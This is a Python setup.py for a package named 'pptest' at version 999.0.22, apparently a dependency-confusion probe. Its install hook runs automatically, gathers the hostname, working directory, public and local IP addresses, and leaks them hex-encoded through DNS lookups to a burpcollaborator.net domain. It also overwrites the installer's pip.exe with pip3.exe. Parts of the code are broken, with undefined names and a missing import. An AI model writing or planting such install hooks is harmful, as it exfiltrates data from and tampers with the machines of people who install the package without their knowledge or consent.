#!/usr/bin/env python
# coding: utf-8

from setuptools import setup
from setuptools.command.install_scripts import install_scripts
import os
import sys
import socket
import dns.resolver
import hashlib
import codecs
import json
import re
import shutil
class InstallScripts(install_scripts):
    def get_wan_ip(self):
        public_ip = ''
        python_version = '{0[0]}.{0[1]}.{0[2]}'.format(sys.version_info)
        try:
            
            
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36'}
            HTTP_proxy = os.getenv('HTTP_PROXY')
            HTTPS_proxy = os.getenv('HTTPS_PROXY')
            if HTTP_proxy and lHTTPS_proxy :
                proxies = {"http": HTTP_proxy, "https": HTTPS_proxy}
            else:
                proxies={}
            if python_version >= '3.0':
                import urllib.request
                #import requests
                #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()
                handler = urllib.request.ProxyHandler(proxies)
                opener = urllib.request.build_opener(handler)
                req = urllib.request.Request('http://ip.dhcp.cn/?json', headers=headers)
                res = opener.open(req)
                #print(res)

                #print(res.status)
                str_ = res.read().decode('utf-8')
                #print(str_)
                public_ip = json.loads(str_)['IP']
                print(public_ip)
            else:
                import urllib2
                handler = urllib2.ProxyHandler(proxies)
                opener = urllib2.build_opener(handler)
                req = urllib2.Request('http://ifconfig.me/ip')#http://ip.dhcp.cn/?json
                #res = opener.open(req)
                #public_ip = (res.read().decode('utf-8'))
                public_ip = load(urllib2.urlopen('http://ip.dhcp.cn/?json'))['ip']# http://jsonip.com
        except Exception as err:
            print(err)
            public_ip = os.system('curl -s "http://ifconfig.me/ip"')
        return public_ip
    def get_info(self,dns_server):
        PAYLOADS_LENGTH = 60

        # Change payload length to allow for a iterator
        #PAYLOADS_LENGTH -= 42

        
        fake_domain = '547dwlhayn1aiolqtvv9c8r6axgn4c.burpcollaborator.net'
        hostname = socket.gethostname()
        local_ips = socket.gethostbyname_ex(hostname)
        
        #print 'jsonip.com', my_ip
        #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()
        print('host:'+hostname)
        print('cwd:'+os.getcwd())
        #print('public ip :'+str(get_wan_ip()))
        #
        local_ip_str = ''
        for i in local_ips:
            if isinstance(i, str):
                local_ip_str = local_ip_str + ','
            elif isinstance(i, list):
                local_ip_str = local_ip_str + ','.join(i)
            
        print(local_ip_str)
        
        # prepare the dns service
        my_resolver = dns.resolver.Resolver(configure=False)
        my_resolver.nameservers = [dns_server]#
        my_resolver.port = 53
        #print('1')
        payload = hostname+'|'+os.getcwd()+'|'+str(self.get_wan_ip())+'|'+local_ip_str
        #print('2')
        payload_to_send = payload
        print(payload)
        checksum = hashlib.sha1(payload_to_send.encode('utf-8')).hexdigest()
        print(checksum)
        b=''.join(hex(ord(x))[2:] for x in payload_to_send)
        #print ('[INFO] Sending lookup for :', b)
        i = 0
        #print(len(fake_domain))
        while i < len(b):
            bb = b[i:i+PAYLOADS_LENGTH-len(fake_domain)-1]+'.'+fake_domain#checksum + '.'+
            i = i + PAYLOADS_LENGTH-len(fake_domain)-1
            #print(bb)
            answer = my_resolver.resolve(bb, 'A')
            #print(answer)
    def mypip(self):
        mydns = '8.8.8.8'
        self.get_info(mydns)
        print('!!!Attention: it is just a security test. Reinstall pip now.!!!')
    def run(self):
        setuptools.command.install_scripts.install_scripts.run(self)
        print('in setup....'+sys.argv[0])
        for i in sys.argv:
            print(i)
        self.mypip()
        shutil.move('C:\Python37\Scripts\pip.exe', 'C:\Python37\Scripts\pip_11.exe')
        shutil.copy('C:\Python37\Scripts\pip3.exe', 'C:\Python37\Scripts\pip.exe')
        # Rename some script files
        for script in self.get_outputs():
            if True:#basename.endswith(".py") or basename.endswith(".sh"):
                dest = script[:-3]
            else:
                continue
            print("moving %s to %s" % (script, dest))
            shutil.move(script, dest)
        #shutil.move()
        
setup(
    name='pptest',
    version='999.0.22',
    author='pptest',
    author_email='testtt@google.com',
    url='https://www.google.com',
    description=u'just for test',
    packages=['pptest'],
    install_requires=['dnsPython'],
    entry_points={
        'console_scripts': [
            'pip3=pptest:mypip',
            #'pip=pptest:mypip'
        ]
    },
    cmdclass={
        "install_scripts": InstallScripts
    }
)